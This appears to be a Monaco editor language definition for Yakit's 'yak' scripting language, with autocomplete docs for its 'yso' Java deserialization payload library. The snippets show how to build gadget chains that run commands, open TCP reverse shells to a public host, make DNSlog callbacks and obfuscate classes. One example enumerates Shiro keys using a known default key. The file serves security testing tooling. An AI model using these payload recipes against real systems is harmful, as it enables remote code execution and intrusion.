export const yakLang = (monaco) => {
  monaco.languages.register({
    id: "yak",
    extensions: [".yak"],
    aliases: ["Yak"],
  });
  monaco.languages.setMonarchTokensProvider("yak", {
    brackets: [
      { open: "{{", close: "}}", token: "double-braces" },
      { open: "{", close: "}", token: "braces" },
      { open: "[", close: "]", token: "brackets" },
      { open: "(", close: ")", token: "parentheses" },
      // {"open": "'", "close": "'", token: "single-quote"},
      // {"open": "\"", "close": "\"", token: "quote"},
      // {"open": "`", "close": "`", token: "backticks"},
      { open: "/**", close: " */", token: "comment" },
    ],
    defaultToken: "",
    tokenPostfix: ".yak",
    keywords: [
      "break",
      "case",
      "continue",
      "default",
      "defer",
      "else",
      "for",
      "go",
      "if",
      "range",
      "return",
      "select",
      "switch",
      "chan",
      "func",
      "fn",
      "def",
      "var",
      "nil",
      "undefined",
      "map",
      "class",
      "include",
      "type",
      "bool",
      "true",
      "false",
      "string",
      "try",
      "catch",
      "finally",
      "in",
      "elif",
    ],
    types: [
      "uint",
      "uint8",
      "byte",
      "uint16",
      "uint32",
      "uint64",
      "int",
      "int8",
      "int16",
      "int32",
      "int64",
      "bool",
      "float",
      "float64",
      "double",
      "string",
      "omap",
      "var",
      "any",
    ],
    operators: [
      "+",
      "-",
      "*",
      "/",
      "%",
      "&",
      "|",
      "^",
      "<<",
      ">>",
      "&^",
      "+=",
      "-=",
      "*=",
      "/=",
      "%=",
      "&=",
      "|=",
      "^=",
      "<<=",
      ">>=",
      "&^=",
      "&&",
      "||",
      "<-",
      "++",
      "--",
      "==",
      "<",
      ">",
      "=",
      "!",
      "!=",
      "<=",
      ">=",
      ":=",
      "...",
      "(",
      ")",
      "",
      "]",
      "{",
      "}",
      ",",
      ";",
      ".",
      ":",
    ],
    libnames: [
      "ai",
      "bin",
      "bot",
      "brute",
      "bufio",
      "cli",
      "codec",
      "context",
      "crawler",
      "crawlerx",
      "csrf",
      "cve",
      "cwe",
      "db",
      "dictutil",
      "dns",
      "dnslog",
      "dyn",
      "env",
      "exec",
      "facades",
      "file",
      "filesys",
      "finscan",
      "fuzz",
      "fuzzx",
      "git",
      "gzip",
      "hids",
      "hook",
      "http",
      "httpool",
      "httpserver",
      "iiop",
      "io",
      "ja3",
      "java",
      "js",
      "json",
      "judge",
      "jwt",
      "ldap",
      "log",
      "math",
      "mitm",
      "mmdb",
      "nasl",
      "nuclei",
      "openai",
      "openapi",
      "orderedmap",
      "os",
      "pcapx",
      "ping",
      "poc",
      "pprof",
      "rdp",
      "re",
      "re2",
      "redis",
      "regen",
      "report",
      "risk",
      "rpa",
      "sandbox",
      "sca",
      "servicescan",
      "simulator",
      "smb",
      "spacengine",
      "ssa",
      "str",
      "subdomain",
      "suricata",
      "sync",
      "synscan",
      "systemd",
      "t3",
      "tcp",
      "time",
      "timezone",
      "tls",
      "tools",
      "traceroute",
      "twofa",
      "udp",
      "x",
      "xhtml",
      "xml",
      "xpath",
      "yakit",
      "yaml",
      "yso",
      "zip",
    ],
    libFuncNames: [
      {
        libName: "zip",
        prefix: "zip.",
        functions: [
          {
            functionName:
              "Decompress(${1:zipFile /*type: string*/}, ${2:dest /*type: string*/})",
            document: "",
            definitionStr:
              "Decompress(zipFile string, dest string) error  doc:解压\n",
          },
          {
            functionName:
              "Compress(${1:zipName /*type: string*/}, ${2:filenames...})",
            document: "",
            definitionStr: "Compress(zipName string, filenames ...string) error",
          },
        ],
      },
      {
        libName: "yso",
        prefix: "yso.",
        functions: [
          {
            functionName:
              "useTomcatEchoTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useTomcatEchoTemplate(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useTomcatEchoEvilClass(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useTomcatEchoEvilClass(config *ClassGenConfig) any",
          },
          {
            functionName: "useTemplate(${1:t /*type: ClassType*/})",
            document: "",
            definitionStr: "useTemplate(t ClassType) GenClassOptionFun",
          },
          {
            functionName:
              "useTcpReverseTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useTcpReverseTemplate(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useTcpReverseShellTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr:
              "useTcpReverseShellTemplate(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useTcpReverseShellEvilClass(${1:host /*type: string*/}, ${2:port /*type: int*/})",
            document: "",
            definitionStr:
              'useTcpReverseShellEvilClass(host string, port int) GenClassOptionFun  doc:SetTcpReverseShellEvilClass\n\nuseTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。\n\n相当于 useTcpReverseShellTemplate ，tcpReverseShellHost，tcpReverseShellPort  三个个函数的组合。\n\nhost：要设置的 tcpReverseShellHost 的host。\n\nport：要设置的 tcpReverseShellPort 的port。\n\nExample:\n```\nhost = "公网IP"\nyso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))\n```\n',
          },
          {
            functionName:
              "useTcpReverseEvilClass(${1:host /*type: string*/}, ${2:port /*type: int*/})",
            document: "",
            definitionStr:
              'useTcpReverseEvilClass(host string, port int) GenClassOptionFun  doc:SetTcpReverseEvilClass\n\nuseTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。\n\n相当于 useTcpReverseTemplate ，tcpReverseHost  两个个函数的组合。\n\nhost：要设置的 tcpReverseHost 的host。\n\nport：要设置的 tcpReversePort 的port。\n\nExample:\n```\nhost = "公网IP"\ntoken = uuid()\nyso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))\n```\n',
          },
          {
            functionName:
              "useSpringEchoTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useSpringEchoTemplate(config *ClassGenConfig) any",
          },
          {
            functionName: "useSleepTime(${1:time /*type: int*/})",
            document: "",
            definitionStr:
              "useSleepTime(time int) GenClassOptionFun  doc:SetSleepTime\n\nuseSleepTime 请求参数选项函数，设置指定的 sleep 时长，需要配合 useSleepTemplate 使用，主要用与指定 sleep 时长，用于延时检测gadget。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s\n```\n",
          },
          {
            functionName:
              "useSleepTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useSleepTemplate(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useSleepEvilClass(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useSleepEvilClass(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useRuntimeExecTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useRuntimeExecTemplate(config *ClassGenConfig) any",
          },
          {
            functionName: "useRuntimeExecEvilClass(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'useRuntimeExecEvilClass(cmd string) GenClassOptionFun  doc:SetRuntimeExecEvilClass\n\nuseRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。\n\ncmd：要执行的命令字符串。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))\n```\n',
          },
          {
            functionName:
              "useProcessImplExecTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr:
              "useProcessImplExecTemplate(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useProcessImplExecEvilClass(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'useProcessImplExecEvilClass(cmd string) GenClassOptionFun  doc:SetProcessImplExecEvilClass\n\nuseProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。\n\ncmd：要执行的命令字符串。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))\n```\n',
          },
          {
            functionName:
              "useProcessBuilderExecTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr:
              "useProcessBuilderExecTemplate(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useProcessBuilderExecEvilClass(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'useProcessBuilderExecEvilClass(cmd string) GenClassOptionFun  doc:SetProcessBuilderExecEvilClass\n\nuseProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。\n\ncmd：要执行的命令字符串。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))\n```\n',
          },
          {
            functionName: "useParam(${1:val /*type: string*/})",
            document: "",
            definitionStr:
              'useParam(val string) GenClassOptionFun  doc:SetParam\n\nspringParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。\n\nparam：要设置的请求参数。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))\n```\n',
          },
          {
            functionName:
              "useMultiEchoEvilClass(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useMultiEchoEvilClass(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useModifyTomcatMaxHeaderSizeTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr:
              "useModifyTomcatMaxHeaderSizeTemplate(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useHeaderParam(${1:key /*type: string*/}, ${2:val /*type: string*/})",
            document: "",
            definitionStr:
              'useHeaderParam(key string, val string) GenClassOptionFun  doc:SetHeader\n\nspringHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。\n\n需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。\n\nkey：要设置的 header 键。\n\nval：要设置的 header 值。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))\n```\n',
          },
          {
            functionName:
              "useHeaderEchoTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useHeaderEchoTemplate(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useHeaderEchoEvilClass(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useHeaderEchoEvilClass(config *ClassGenConfig) any",
          },
          {
            functionName: "useEchoBody(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useEchoBody(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useDNSlogTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useDNSlogTemplate(config *ClassGenConfig) any",
          },
          {
            functionName: "useDNSLogEvilClass(${1:addr /*type: string*/})",
            document: "",
            definitionStr:
              'useDNSLogEvilClass(addr string) GenClassOptionFun  doc:SetDnslogEvilClass\n\nuseDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。\n\naddr：要设置的 Dnslog 域名。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))\n```\n',
          },
          {
            functionName:
              "useConstructorExecutor(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "useConstructorExecutor(config *ClassGenConfig) any",
          },
          {
            functionName:
              "useClassParam(${1:k /*type: string*/}, ${2:v /*type: string*/})",
            document: "",
            definitionStr: "useClassParam(k string, v string) GenClassOptionFun",
          },
          {
            functionName:
              "useClassMultiEchoTemplate(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr:
              "useClassMultiEchoTemplate(config *ClassGenConfig) any",
          },
          {
            functionName: "useBytesEvilClass(${1:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "useBytesEvilClass(data []byte) GenClassOptionFun  doc:SetBytesEvilClass\n\nuseBytesEvilClass 请求参数选项函数，传入自定义的字节码。\n\ndata：自定义的字节码。\n\nExample:\n```\nbytesCode,_ =codec.DecodeBase64(bytes)\ngadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))\n```\n",
          },
          {
            functionName: "useBytesClass(${1:data /*type: []byte*/})",
            document: "",
            definitionStr:
              "useBytesClass(data []byte) GenClassOptionFun  doc:SetClassBytes\n\nuseBytesClass 请求参数选项函数，传入字节码。\n\ndata：字节码。\n\nExample:\n```\nbytesCode,_ =codec.DecodeBase64(bytes)\ngadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))\n```\n",
          },
          {
            functionName: "useBase64BytesClass(${1:base64 /*type: string*/})",
            document: "",
            definitionStr:
              "useBase64BytesClass(base64 string) GenClassOptionFun  doc:SetClassBase64Bytes\n\nuseBase64BytesClass 请求参数选项函数，传入base64编码的字节码。\n\nbase64：base64编码的字节码。\n\nExample:\n```\ngadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBase64BytesClass(base64Class))\n```\n",
          },
          {
            functionName:
              "twoBytesCharString(${1:ctx /*type: *yserx.MarshalContext*/})",
            document: "",
            definitionStr: "twoBytesCharString(ctx *yserx.MarshalContext) any",
          },
          {
            functionName:
              "threeBytesCharString(${1:ctx /*type: *yserx.MarshalContext*/})",
            document: "",
            definitionStr: "threeBytesCharString(ctx *yserx.MarshalContext) any",
          },
          {
            functionName: "tcpReverseToken(${1:token /*type: string*/})",
            document: "",
            definitionStr:
              'tcpReverseToken(token string) GenClassOptionFun  doc:SetTcpReverseToken\n\ntcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。\n\ntoken：要设置的 token 。\n\nExample:\n```\nhost = "公网IP"\ntoken = uuid()\nyso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))\n```\n',
          },
          {
            functionName: "tcpReversePort(${1:port /*type: int*/})",
            document: "",
            definitionStr:
              'tcpReversePort(port int) GenClassOptionFun  doc:SetTcpReversePort\n\ntcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。\n\n还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。\n\nport：要设置的 tcpReversePort 的port。\n\nExample:\n```\nhost = "公网IP"\ntoken = uuid()\nyso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))\n```\n',
          },
          {
            functionName: "tcpReverseHost(${1:host /*type: string*/})",
            document: "",
            definitionStr:
              'tcpReverseHost(host string) GenClassOptionFun  doc:SetTcpReverseHost\n\ntcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。\n\n还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。\n\nhost：要设置的 tcpReverseHost 的host。\n\nExample:\n```\nhost = "公网IP"\ntoken = uuid()\nyso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))\n```\n',
          },
          {
            functionName:
              "springRuntimeExecAction(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "springRuntimeExecAction(config *ClassGenConfig) any",
          },
          {
            functionName: "springParam(${1:val /*type: string*/})",
            document: "",
            definitionStr:
              'springParam(val string) GenClassOptionFun  doc:SetParam\n\nspringParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。\n\nparam：要设置的请求参数。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))\n```\n',
          },
          {
            functionName:
              "springHeader(${1:key /*type: string*/}, ${2:val /*type: string*/})",
            document: "",
            definitionStr:
              'springHeader(key string, val string) GenClassOptionFun  doc:SetHeader\n\nspringHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。\n\n需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。\n\nkey：要设置的 header 键。\n\nval：要设置的 header 值。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))\n```\n',
          },
          {
            functionName: "springEchoBody(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr: "springEchoBody(config *ClassGenConfig) any",
          },
          {
            functionName:
              "obfuscationClassConstantPool(${1:config /*type: *ClassGenConfig*/})",
            document: "",
            definitionStr:
              "obfuscationClassConstantPool(config *ClassGenConfig) any",
          },
          {
            functionName: "majorVersion(${1:v /*type: uint16*/})",
            document: "",
            definitionStr: "majorVersion(v uint16) GenClassOptionFun",
          },
          {
            functionName: "evilClassName(${1:className /*type: string*/})",
            document: "",
            definitionStr:
              'evilClassName(className string) GenClassOptionFun  doc:SetClassName\n\nevilClassName 请求参数选项函数，用于设置生成的类名。\n\nclassName：要设置的类名。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))\n```\n',
          },
          {
            functionName: "dump(${1:i})",
            document: "",
            definitionStr:
              "dump(i any) (string, error)  doc:dump 将Java 对象转换为类 Java 代码\n\nExample:\n```\ngadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))\ngadgetDump,_ = yso.dump(gadgetObj)\n```\n",
          },
          {
            functionName: "dnslogDomain(${1:addr /*type: string*/})",
            document: "",
            definitionStr:
              'dnslogDomain(addr string) GenClassOptionFun  doc:SetDnslog\n\ndnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。\n\naddr：要设置的 Dnslog 域名。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))\n```\n',
          },
          {
            functionName: "dirtyDataLength(${1:length /*type: int*/})",
            document: "",
            definitionStr: "dirtyDataLength(length int) MarshalOptionFun",
          },
          {
            functionName: "command(${1:cmd /*type: string*/})",
            document: "",
            definitionStr:
              'command(cmd string) GenClassOptionFun  doc:SetExecCommand\n\ncommand 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。\n\nExample:\n```\nyso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())\n```\n',
          },
          {
            functionName: "ToJson(${1:i})",
            document: "",
            definitionStr:
              "ToJson(i any) (string, error)  doc:ToJson 将 Java 或反序列化对象转换为 json 字符串\n\nExample:\n```\ngadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))\ngadgetJson,_ = yso.ToJson(gadgetObj)\n```\n",
          },
          {
            functionName: "ToBytes(${1:i}, ${2:opts...})",
            document: "",
            definitionStr:
              "ToBytes(i any, opts ...MarshalOptionFun) ([]byte, error)  doc:ToBytes 将 Java 或反序列化对象转换为字节码\n\nExample:\n```\ngadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))\ngadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000),yso.twoBytesCharString())\n```\n",
          },
          {
            functionName: "ToBcel(${1:i})",
            document: "",
            definitionStr: "ToBcel(i any) (string, error)",
          },
          {
            functionName:
              "LoadClassFromBytes(${1:bytes /*type: []byte*/}, ${2:options...})",
            document: "",
            definitionStr:
              'LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。\n\n这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。\n\n这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。\n\nbytes：要从中加载类对象的字节数组。\n\noptions：用于配置类对象的可变参数函数列表。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nbytesCode,_ =codec.DecodeBase64("yv66vg...")\nclassObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象\n```\n',
          },
          {
            functionName:
              "LoadClassFromBase64(${1:base64 /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:LoadClassFromBase64 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。\n\n这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。\n\n这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。\n\nbase64：要从中加载类对象的base64编码字符串。\n\noptions：用于配置类对象的可变参数函数列表。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nclassObject, _ := yso.LoadClassFromBytes("yv66vg...") // 从字节中加载并配置类对象\n```\n',
          },
          {
            functionName:
              "LoadClassFromBCEL(${1:data /*type: string*/}, ${2:options...})",
            document: "",
            definitionStr:
              'LoadClassFromBCEL(data string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)  doc:LoadClassFromBCEL 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组，\n\n并从这些字节中加载并返回一个javaclassparser.ClassObject对象。\n\n这个函数首先使用javaclassparser.Bcel2bytes转换BCEL格式的数据，然后利用GenerateClassObjectFromBytes生成类对象。\n\n可通过可变参数`options`来定制类对象的特定属性或行为。\n\ndata：BCEL格式的Java类数据。\n\noptions：用于配置类对象的可变参数函数列表。\n\n返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nbcelData := "$$BECL$$..." // 假设的BCEL数据\nclassObject, err := LoadClassFromBCEL(bcelData, option1, option2) // 从BCEL数据加载并配置类对象\n```\n',
          },
          {
            functionName: "GetURLDNSJavaObject(${1:url /*type: string*/})",
            document: "",
            definitionStr:
              "GetURLDNSJavaObject(url string) (*JavaObject, error)  doc:GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。\n\n这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。\n\nurl：要在生成的Java对象中设置的URL字符串。\n\n返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nurl, token, _ = risk.NewDNSLogDomain()\njavaObject, _ = yso.GetURLDNSJavaObject(url)\ngadgetBytes,_ = yso.ToBytes(javaObject)\n使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器\nres,err = risk.CheckDNSLogByToken(token)\n\n\tif err {\n\t  //dnslog查询失败\n\t} else {\n\t  if len(res) > 0{\n\t   // dnslog查询成功\n\t  }\n\t}\n\n```\n",
          },
          {
            functionName: "GetSimplePrincipalCollectionJavaObject()",
            document: "",
            definitionStr:
              'GetSimplePrincipalCollectionJavaObject() (*JavaObject, error)  doc:GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。\n\n主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。\n\n使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。\n\nExample:\n```\njavaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()\nclassBytes,_ = yso.ToBytes(javaObject)\ndata = codec.PKCS5Padding(classBytes, 16)\nkeyDecoded,err = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")\niv = []byte(ramdstr(16))\ncipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)\npayload = codec.EncodeBase64(append(iv, cipherText...))\n发送 payload\n```\n',
          },
          {
            functionName: "GetJdk8u20JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetJdk8u20JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetJdk7u21JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetJdk7u21JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetJdk7u21JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetJavassistWeld1JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetJavassistWeld1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetJavassistWeld1JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetJavaObjectFromBytes(${1:byt /*type: []byte*/})",
            document: "",
            definitionStr:
              'GetJavaObjectFromBytes(byt []byte) (*JavaObject, error)  doc:GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。\n\n此函数使用ParseJavaSerialized方法来解析提供的字节序列，\n\n并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，\n\n函数将返回错误。如果解析成功，它将返回解析出的第一个Java对象。\n\nbyt：要解析的字节数组。\n\n返回：成功时返回第一个Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\nraw := "rO0..." // base64 Java serialized object\nbytes = codec.DecodeBase64(raw)~ // base64解码\njavaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象\n```\n',
          },
          {
            functionName: "GetJSON1JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetJSON1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetJSON1JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetJBossInterceptors1JavaObject(${1:options...})",
            document: "",
            definitionStr:
              'GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) (*JavaObject, error)  doc:GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。\n\n通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。\n\n这些函数使用户能够定制生成的Java对象的特定属性或行为。\n\noptions：用于配置Java对象的可变参数函数列表。\n\n返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。\n\nExample:\n```\ncommand = "whoami"\nclassName = "KEsBXTRS"\ngadgetObj,err = yso.GetJBossInterceptors1JavaObject(\n\n\tyso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令\n\tyso.obfuscationClassConstantPool(),\n\tyso.evilClassName(className), // 指定恶意类的名称\n\n)\n```\n',
          },
          {
            functionName: "GetGroovy1JavaObject(${1:cmd /*type: string*/})",
